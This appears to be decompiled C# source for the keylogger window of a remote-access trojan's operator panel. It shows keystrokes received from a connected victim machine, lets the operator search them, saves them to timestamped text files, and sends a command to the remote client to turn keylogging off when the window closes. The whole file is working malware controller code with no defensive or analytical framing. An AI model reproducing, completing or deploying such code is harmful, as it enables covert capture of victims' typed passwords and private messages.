using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x020000A2 RID: 162
	public partial class FormKeylogger : Form
	{
		// Token: 0x060004F7 RID: 1271 RVA: 0x0000499E File Offset: 0x00002B9E
		public FormKeylogger()
		{
			this.InitializeComponent();
		}

		// Token: 0x170000BE RID: 190
		// (get) Token: 0x060004F8 RID: 1272 RVA: 0x000049B7 File Offset: 0x00002BB7
		// (set) Token: 0x060004F9 RID: 1273 RVA: 0x000049BF File Offset: 0x00002BBF
		public FormMain F { get; set; }

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x060004FA RID: 1274 RVA: 0x000049C8 File Offset: 0x00002BC8
		// (set) Token: 0x060004FB RID: 1275 RVA: 0x000049D0 File Offset: 0x00002BD0
		internal Clients Client { get; set; }

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x060004FC RID: 1276 RVA: 0x000049D9 File Offset: 0x00002BD9
		// (set) Token: 0x060004FD RID: 1277 RVA: 0x000049E1 File Offset: 0x00002BE1
		public string FullPath { get; set; }

		// Token: 0x060004FE RID: 1278 RVA: 0x00041A5C File Offset: 0x0003FC5C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060004FF RID: 1279 RVA: 0x000049EA File Offset: 0x00002BEA
		private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
		{
			StringBuilder sb = this.Sb;
			if (sb != null)
			{
				sb.Clear();
			}
			if (this.Client != null)
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "Logger";
					msgPack.ForcePathObject("isON").AsString = "false";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				});
			}
		}

		// Token: 0x06000500 RID: 1280 RVA: 0x00041A9C File Offset: 0x0003FC9C
		private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			this.richTextBox1.SelectionStart = 0;
			this.richTextBox1.SelectAll();
			this.richTextBox1.SelectionBackColor = Color.White;
			if (e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
			{
				int num;
				for (int i = 0; i < this.richTextBox1.TextLength; i += num + this.toolStripTextBox1.Text.Length)
				{
					num = this.richTextBox1.Find(this.toolStripTextBox1.Text, i, RichTextBoxFinds.None);
					if (num == -1)
					{
						break;
					}
					this.richTextBox1.SelectionStart = num;
					this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
					this.richTextBox1.SelectionBackColor = Color.Yellow;
				}
			}
		}

		// Token: 0x06000501 RID: 1281 RVA: 0x00041B6C File Offset: 0x0003FD6C
		private void ToolStripButton1_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				File.WriteAllText(this.FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
			}
			catch
			{
			}
		}

		// Token: 0x0400046B RID: 1131
		public StringBuilder Sb = new StringBuilder();
	}
}
